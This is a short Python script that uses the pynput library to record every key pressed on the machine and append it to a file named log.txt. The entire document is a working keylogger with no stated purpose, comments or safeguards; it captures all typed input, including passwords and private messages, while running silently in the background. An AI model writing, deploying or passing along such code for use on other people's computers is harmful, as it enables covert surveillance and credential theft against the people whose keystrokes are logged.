from pynput import keyboard

def on_press(key):
    try:

        with open("log.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:

        with open("log.txt", "a") as f:
            f.write(str(key))


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
